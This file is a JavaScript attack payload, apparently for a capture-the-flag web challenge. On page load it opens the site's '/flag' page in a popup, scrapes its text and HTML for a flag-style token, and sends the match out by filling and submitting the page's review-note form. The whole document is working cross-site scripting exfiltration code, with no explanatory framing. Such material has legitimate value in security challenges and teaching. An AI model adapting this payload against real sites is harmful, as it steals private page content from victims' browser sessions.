(() => {
  const start = () => {
    const form = document.getElementById('review-note');
    const note = form?.elements.namedItem('note');
    if (!form || !note) return;

    let sent = false;
    const send = (value) => {
      if (sent) return;
      sent = true;
      note.value = String(value).slice(0, 6000);
      form.submit();
    };

    let popup = null;
    try {
      popup = window.open('/flag', 'firebird_flag');
    } catch {}

    let attempts = 0;
    const timer = setInterval(() => {
      attempts += 1;
      try {
        if (popup?.document?.readyState === 'complete') {
          const text = popup.document.body?.innerText || '';
          const html = popup.document.documentElement?.innerHTML || '';
          const match = `${text}\n${html}`.match(/(?:firebird|flag|ctf)\{[^}]+\}/i);
          popup.close();
          if (match) {
            clearInterval(timer);
            send(match[0]);
            return;
          }
        }
      } catch {}

      if (attempts >= 30) {
        clearInterval(timer);
        send(`payload-ran popup=${Boolean(popup)}`);
      }
    }, 100);
  };

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', start, { once: true });
  } else {
    start();
  }
})();
